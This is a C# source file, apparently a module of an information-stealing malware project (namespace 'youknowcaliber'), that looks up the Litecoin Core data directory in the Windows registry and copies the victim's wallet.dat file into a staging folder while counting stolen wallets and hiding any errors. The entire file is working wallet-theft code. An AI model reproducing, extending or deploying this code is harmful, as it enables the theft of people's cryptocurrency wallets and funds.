using Microsoft.Win32;
using System.IO;

namespace youknowcaliber
{
    class LitecoinCore
    {
        public static int count = 0;
        public static void LitecStr(string directorypath) 
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt");
                Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
                File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
                count++;
                Counting.Wallets++;
            }
            catch 
            {
                return;
            }
        }
    }
}
